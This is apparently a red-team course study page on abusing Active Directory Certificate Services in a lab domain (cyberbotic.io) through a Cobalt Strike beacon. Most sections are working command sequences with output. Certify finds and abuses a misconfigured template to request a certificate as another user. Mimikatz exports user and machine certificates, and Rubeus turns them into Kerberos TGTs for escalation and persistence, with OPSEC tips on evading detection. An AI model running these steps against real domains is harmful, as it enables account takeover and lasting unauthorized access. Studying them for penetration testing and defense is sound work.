---
description: 10/01/2025
---

# ✅ Active Directory Certificate Services (AD CS)

## Introduction

_<mark style="color:yellow;">**AD CS is a server role that allows you to build a public key infrastructure (PKI)**</mark>_.

This provides public key cryptography, digital certificates, and digital signature capabilities.&#x20;

**Some practical applications to AD CS include:**

* Secure/Multipurpose Internet Mail Extensions (S/MIME), secure wireless networks, virtual private networks (VPNs), Internet Protocol security (IPsec), Encrypting File System (EFS), smart card logon, and Secure Socket Layer/Transport Layer Security (SSL/TLS).

**Correct implementation can improve the overall security of an organization:**

* **Confidentiality -> Encryption**
* **Integrity -> Digital signatures**
* **Authentication -> Association from certificate keys with computer, user, or device accounts on the network**

## Importance of AD CS Misconfigurations&#x20;

Like any other technology, misconfigurations can lead to an introduction of a plethora of security risks that threat actors can leverage.

In this case, _Privilege_ _Escalation_ (even domain user to domain admin) and persistence.&#x20;

Check out this white paper for more low-level details on [**Abusing Active Directory Certificate Services**](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).

## Finding Certificate Authorities (CA's)

### A Quick Lesson: Domains VS Forests

A _**domain**_ is a specific organizational boundary in AD, containing users, computers, and resources.

A _**forest**_ is the highest-level container that groups one or more related domains (often in trees), defining a single security boundary and shared scheme for all of its member domains.

### Using Certify to find AD CS CA's

**To find AD CS CA's in a domain or forest, run** [**Certify**](https://github.com/GhostPack/Certify) **with the&#x20;**<mark style="color:yellow;">**`cas`**</mark>**&#x20;parameter:**

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

**This will output lots of useful information, including the root CA and subordinate CAs:**

```
Enterprise CA Name            : ca
DNS Hostname                  : dc-1.cyberbotic.io
FullName                      : dc-1.cyberbotic.io\ca
Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
Cert SubjectName              : CN=ca, DC=cyberbotic, DC=io
Cert Thumbprint               : 95AF7043BD6241CEE92E6DC6CB8D22494E396CCF
Cert Serial                   : 17DDB078863F61884B680FE6F59211AD
Cert Start Date               : 8/15/2022 3:42:59 PM
Cert End Date                 : 8/15/2047 3:52:59 PM
Cert Chain                    : CN=ca,DC=cyberbotic,DC=io

Enterprise CA Name            : sub-ca
DNS Hostname                  : dc-2.dev.cyberbotic.io
FullName                      : dc-2.dev.cyberbotic.io\sub-ca
Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
Cert SubjectName              : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
Cert Thumbprint               : 697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
Cert Serial                   : 13000000046EF818036CF8C99F000000000004
Cert Start Date               : 8/15/2022 4:06:13 PM
Cert End Date                 : 8/15/2024 4:16:13 PM
Cert Chain                    : CN=ca,DC=cyberbotic,DC=io -> CN=sub-ca,DC=dev,DC=cyberbotic,DC=io
```

The _<mark style="color:yellow;">**Cert Chain**</mark>_ is useful to note, as this shows us that the <mark style="color:yellow;">`sub-ca`</mark> in the <mark style="color:yellow;">`DEV`</mark> domain is a **subordinate** of <mark style="color:yellow;">`ca`</mark> in the <mark style="color:yellow;">`CYBER`</mark> domain.&#x20;

* The output also lists the certificate templates that are available at each CA, as well as some information about which principals are allowed to manage them.

## Misconfigured Certificate Templates

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.

They are designed to be duplicated and configured for specific needs.

_**Misconfigurations**_ within these templates can be <mark style="color:$danger;">abused for privilege escalation</mark>.

### Using Certify to find Vulnerable Templates

**Certify command to find vulnerable templates:**

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

#### Key parts of this output

1. This template is served by `sub-ca`
2. The template is called `CustomUser`
3. `ENROLLEE_SUPPLIES_SUBJECT` is _**enabled**_, which allows for the certificate requestor to provide any SAN (Subject Alternative Name)
4. The certificate usage has `Client Authentication` set
5. `DEV\Domain Users` have enrollment rights, so any domain user may request a certificate from this template

{% hint style="info" %}
_**If a principal you control has****&#x20;****`WriteOwner`****,****&#x20;****`WriteDacl`****&#x20;****or****&#x20;****`WriteProperty`****, then this could also be abused.**_
{% endhint %}

This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication.

### Why it is Misconfigured/Vulnerable

1. Vulnerable because it has <mark style="color:yellow;">`ENROLLEE_SUPPLIES_SUBJECT`</mark> <mark style="color:$danger;">enabled</mark>.
2. <mark style="color:yellow;">`Domain Users`</mark> is <mark style="color:$danger;">INVOLVED</mark>.
3. _<mark style="color:$danger;">**This means any domain user in the**</mark><mark style="color:$danger;">**&#x20;**</mark><mark style="color:$danger;">**`DEV`**</mark><mark style="color:$danger;">**&#x20;**</mark><mark style="color:$danger;">**domain can request a user certificate for any OTHER user in the domain**</mark>_!

### Abusing Misconfigured Templates

<mark style="color:$success;">**Request a certificate**</mark>**&#x20;for&#x20;**<mark style="color:yellow;">**`nlamb`**</mark>**:**

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

[*] Action: Request a Certificates
[*] Current user context    : DEV\bfarmer
[*] No subject name specified, using current context as subject.

[*] Template                : CustomUser
[*] Subject                 : CN=Bob Farmer, CN=Users, DC=dev, DC=cyberbotic, DC=io
[*] AltName                 : nlamb

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\sub-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 11

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:05.4521116
```

{% hint style="warning" %}
Copy the whole certificate (both the private key and certificate) and save it to <mark style="color:yellow;">`cert.pem`</mark> on Ubuntu WSL.
{% endhint %}

**Then, use the provided `openssl` command to convert it to&#x20;**<mark style="color:yellow;">**`pfx`**</mark>**&#x20;format:**

```
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
```

**Convert&#x20;**<mark style="color:yellow;">**`cert.pfx`**</mark>**&#x20;into a base64 encoded string so it can be used with Rubeus:**

```
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0
MIIM7w[...]ECAggA
```

* `-w 0` removes line breaks

_**Copy/paste the certificate.**_

**Now, use Rubeus'&#x20;**<mark style="color:yellow;">**`asktgt`**</mark>**&#x20;to request a TGT for the user using the certificate:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap

[*] Using PKINIT with etype rc4_hmac and subject: CN=Bob Farmer, CN=Users, DC=dev, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\nlamb'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGQj[...]5pbw==

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/7/2022 8:51:22 AM
  EndTime                  :  9/7/2022 6:51:22 PM
  RenewTill                :  9/14/2022 8:51:22 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  AliVFc5Nk93Z7IUkweCnBQ==
  ASREP (key)              :  4DB9D9D76701696109C28A26D27DE0B0
```

Now we have the TGT as `nlamb` to leverage to access any machine in the domain!

## User & Compliance Persistence

_<mark style="color:$danger;">**Certificates can also be useful for maintaining persistent access**</mark>_ to both users and computers, because they tend to have a much longer shelf-life compared to passwords.

For example, _<mark style="color:yellow;">**User Certificates are valid for an entire year by default**</mark>_, regardless of password changes.

**See below:**

```
CA Name             : dc-2.dev.cyberbotic.io\sub-ca
Template Name       : User
Schema Version      : 1
Validity Period     : 1 year
```

**Certificates only become invalid by:**

1. Revoked by Certificate Authority
2. Or expire

This does not rely on any vulnerable templates.

{% hint style="success" %}
<mark style="color:$success;">**We can extract certificates that have been already issues or just request new ones**</mark>**.**
{% endhint %}

### User Persistence

**User certificates that have already been issued can be found in the user's Personal Certificate Store:**

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**If we have a&#x20;**<mark style="color:yellow;">**Beacon running on their machine**</mark>**,&#x20;**<mark style="color:$success;">**we can enumerate their certificates with Seatbelt**</mark>**:**

```
beacon> getuid
[*] You are DEV\nlamb

beacon> run hostname
wkstn-1

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

  StoreLocation      : CurrentUser
  Issuer             : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
  Subject            : E=nlamb@cyberbotic.io, CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io
  ValidDate          : 9/7/2022 11:44:35 AM
  ExpiryDate         : 9/7/2023 11:44:35 AM
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : 43FA3C3AE4E1212A3F888937745C2E2F55BAC1B5
  Template           : User
  EnhancedKeyUsages  :
       Encrypting File System
       Secure Email
       Client Authentication     [!] Certificate is used for client authentication!
```

{% hint style="info" %}
See the alert on the last line?? _<mark style="color:$success;">**Always ensure the certificate is used for client authentication**</mark>_.
{% endhint %}

**Certificates can be exported with Mimikatz using `crypto::certificates`:**

```
beacon> mimikatz crypto::certificates /export

    Public export  : OK - 'CURRENT_USER_My_0_Nina Lamb.der'
    Private export : OK - 'CURRENT_USER_My_0_Nina Lamb.pfx'

beacon> download CURRENT_USER_My_0_Nina Lamb.pfx
[*] started download of C:\Users\nlamb\CURRENT_USER_My_0_Nina Lamb.pfx (3454 bytes)
[*] download of CURRENT_USER_My_0_Nina Lamb.pfx is complete
```

{% hint style="danger" %}
**Be aware: it drops them to disk.**
{% endhint %}

{% hint style="info" %}
&#x20; Go to _**View > Downloads**_ to sync files from Cobalt Strike to your local machine.
{% endhint %}

**Next, Base64 encode the `pfx` file:**

{% code overflow="wrap" %}
```
ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0
```
{% endcode %}

**Then, use it with Rubeus to obtain a TGT.&#x20;**<mark style="color:yellow;">**The export password will be**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`mimikatz`**</mark>**:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /nowrap

[*] Using PKINIT with etype rc4_hmac and subject: E=nlamb@cyberbotic.io, CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\nlamb'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIGQj[...]5pbw==

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/7/2022 12:28:51 PM
  EndTime                  :  9/7/2022 10:28:51 PM
  RenewTill                :  9/14/2022 12:28:51 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Cptkd+BVLZ8+NS11BQQ6Zg==
  ASREP (key)              :  79C05DC0CC7909DF6448F1B24FAFBD71
```

{% hint style="danger" %}
**OPSEC**\
\
You may notice that this will request RC4 tickets by default. &#x20;

You can force the use of AES256 by including the `/enctype:aes256` parameter.
{% endhint %}

In some cases, user(s) may not have a certificate in their store.

**If this is the case, and the user does not have a certificate in their store, we can just request one with Certify:**

{% code overflow="wrap" %}
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
```
{% endcode %}

### Computer Persistence

**The same can be applied to computer accounts, but we must elevate to extract those certificates:**

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

    Public export  : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.der'
    Private export : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.pfx'
```

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=wkstn-1.dev.cyberbotic.io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\WKSTN-1$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIGYD[...]5pbw==

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  WKSTN-1$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/7/2022 12:06:02 PM
  EndTime                  :  9/7/2022 10:06:02 PM
  RenewTill                :  9/14/2022 12:06:02 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  6DV6vQB5lRoCz84qmRqt0X6UdIzzdQiX+y0IwwDrHlc=
  ASREP (key)              :  C1B715AF5F9B5468EB5FA8ADDA0E02EE2D7548F439DEA5A5D9B4F7DFA6482BDF
```

**If you're requesting a machine certificate with Certify, the&#x20;**<mark style="color:yellow;">**`/machine`**</mark>**&#x20;parameter is required to auto-elevate to `SYSTEM` and assume the identity of the computer account:**

{% code overflow="wrap" %}
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
```
{% endcode %}
